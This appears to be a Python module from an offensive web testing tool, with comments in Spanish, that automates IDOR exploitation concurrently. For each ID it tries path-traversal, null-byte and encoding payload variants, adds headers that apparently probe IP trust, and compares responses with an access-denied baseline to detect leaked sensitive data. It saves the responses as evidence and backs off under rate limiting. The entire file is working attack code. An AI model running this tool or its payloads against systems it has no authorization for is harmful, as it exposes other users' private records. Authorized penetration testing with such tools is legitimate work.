"""
Explotación IDOR -- versión concurrente.

La v2.1 era 100% secuencial: un `for id: for payload:` con
`sleep_jitter()` por cada request. Con un ids.txt de miles de líneas y
~15 variantes de payload por ID (ver payloads()), un solo endpoint tomaba
horas. Ahora se usa ThreadPoolExecutor con límite de workers configurable
y un RateLimiter compartido que hace backoff automático si el target
empieza a devolver 429, en vez de mantener un ritmo fijo ciego al estado
real del servidor.
"""
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.detection import es_bloqueada, detectar_datos_sensibles
from core.http_client import ip_trust_probe_headers, RateLimiter
from core.evidence import guardar_evidencia


def payload_variants(id_value):
    """Variantes del ID para maximizar cobertura (encoding, traversal,
    extensión de archivo, etc.) -- igual que la v2.1, sin cambios porque
    esta parte funcionaba bien."""
    return [
        id_value,
        f"{id_value}/*",
        f"{id_value}%20",
        f"{id_value}/",
        f"{id_value}.json",
        f"{id_value}.xml",
        f"{id_value}?",
        f"{id_value}%09",
        f"{id_value}%00",
        f"{id_value};",
        f"{id_value}#",
        f"{id_value}@",
        f"{id_value}..;/",
        f"{id_value}../",
        f"{id_value}%2e%2e%2f",
        f"{id_value}%252e%252e%252f",
    ]


def _build_url(url, param_name, value):
    if f"{param_name}=" in url:
        return re.sub(f"{param_name}=[^&]*", f"{param_name}={value}", url)
    conector = "&" if "?" in url else "?"
    return f"{url}{conector}{param_name}={value}"


def obtener_baseline(session, url, param_name, headers, method, timeout=10):
    """Petición con un ID improbable para conseguir la respuesta típica de
    acceso denegado, contra la que se compara todo lo demás por similitud."""
    id_fake = "999999999999999"
    objetivo = _build_url(url, param_name, id_fake)
    try:
        resp = session.request(method=method, url=objetivo, headers=headers, timeout=timeout)
        return resp
    except Exception:
        return None


def explotar_idor(url, param_name, id_list, headers, forbidden_signature, method,
                   session, threads=10, timeout=10, capture_evidence=True,
                   silent=False, progress_cb=None):
    """
    Prueba cada ID (y sus variantes de encoding) contra el endpoint,
    concurrentemente, comparando cada respuesta contra el baseline de
    acceso denegado por similitud de contenido (ver core/detection.py).
    """
    baseline_resp = obtener_baseline(session, url, param_name, headers, method, timeout)
    baseline_text = baseline_resp.text if baseline_resp is not None else None
    if not silent and baseline_resp is not None:
        print(f"[i] Baseline acceso denegado: HTTP {baseline_resp.status_code}, "
              f"longitud {len(baseline_text)}")

    payloads = [p for id_ in id_list for p in payload_variants(id_)]
    resultados = []
    limiter = RateLimiter()

    def probar(payload):
        limiter.wait()
        objetivo = _build_url(url, param_name, payload)
        req_headers = ip_trust_probe_headers(headers.copy() if headers else None)
        try:
            resp = session.request(method=method, url=objetivo, headers=req_headers,
                                    timeout=timeout)
            limiter.note_response(resp.status_code)
            bloqueada, razon, ratio = es_bloqueada(resp, forbidden_signature, baseline_text)
            sensibles = detectar_datos_sensibles(resp.text) if not bloqueada else []

            resultado = {
                "id": payload,
                "status": resp.status_code,
                "desc": razon + (f" [datos sensibles: {', '.join(sensibles)}]" if sensibles else ""),
                "vulnerable": not bloqueada,
                "similitud": ratio,
            }
            if not bloqueada and capture_evidence:
                ev_path = guardar_evidencia(
                    resultado,
                    {"method": method, "url": objetivo, "headers": req_headers, "body": None},
                    {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text},
                )
                resultado["evidencia"] = ev_path
            return resultado
        except Exception as e:
            return {"id": payload, "status": "ERROR", "desc": str(e), "vulnerable": False}

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(probar, p): p for p in payloads}
        done = 0
        for future in as_completed(futures):
            resultados.append(future.result())
            done += 1
            if progress_cb:
                progress_cb(done, len(payloads))
    return resultados
